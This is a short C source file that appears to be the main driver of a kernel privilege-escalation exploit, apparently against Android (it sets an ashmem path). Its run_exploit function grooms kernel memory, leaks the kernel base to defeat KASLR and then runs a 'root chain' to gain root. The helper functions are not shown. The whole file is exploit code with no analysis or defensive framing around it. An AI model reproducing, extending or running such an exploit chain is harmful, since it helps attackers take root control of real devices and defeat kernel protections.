#include "common.h"

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  ksym_config_init();
  groom_tunables_init();
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(g_core);
  if (!slide_leak_kernel_base()) {
    pr_error("Slide kaslr leak failed\n");
    return 1;
  }

  pin_to_core(g_core);

  int ok = root_chain_run();
  _exit(ok ? 0 : 1);
}
